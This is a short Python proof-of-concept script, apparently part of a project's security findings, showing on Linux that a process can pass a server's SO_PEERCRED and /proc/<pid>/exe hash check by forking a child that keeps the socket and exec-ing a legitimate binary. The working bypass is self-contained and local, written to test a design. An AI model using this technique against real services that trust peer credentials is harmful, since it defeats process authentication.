#!/usr/bin/env python3
# T03 补充实测（Linux）：fork+exec 冒充。connect 后 fork 出子进程持 socket、父进程 exec 原版二进制；
# 服务端按 SO_PEERCRED 的 pid 读 /proc/<pid>/exe 看到原版映像，实际收发的是攻击者子进程。
# 用法：在 Linux 容器里 python3 tools/t0/iwork-t03-linux-forkexec.py（结论见 docs/design/t0-findings.md 第 6 节）
import os, socket, struct, hashlib, time, sys, shutil
d = "/tmp/fe"; os.makedirs(d, exist_ok=True)
path = d + "/s"; legit = d + "/legit"
shutil.copy("/bin/sleep", legit)
srv = socket.socket(socket.AF_UNIX); srv.bind(path); srv.listen()
if os.fork() == 0:
    # attacker: connect, fork a child that keeps the socket, then exec the legit binary
    c = socket.socket(socket.AF_UNIX); c.connect(path)
    if os.fork() == 0:
        time.sleep(1); c.send(b"from attacker child pid %d" % os.getpid()); os._exit(0)
    os.execv(legit, [legit, "5"])
conn, _ = srv.accept()
time.sleep(0.5)
pid, uid, gid = struct.unpack("3i", conn.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED, 12))
h = hashlib.sha256(open(f"/proc/{pid}/exe","rb").read()).hexdigest()
print("peercred pid", pid, "exe", os.readlink(f"/proc/{pid}/exe"), "hash==legit", h == hashlib.sha256(open(legit,"rb").read()).hexdigest())
print("received:", conn.recv(100))
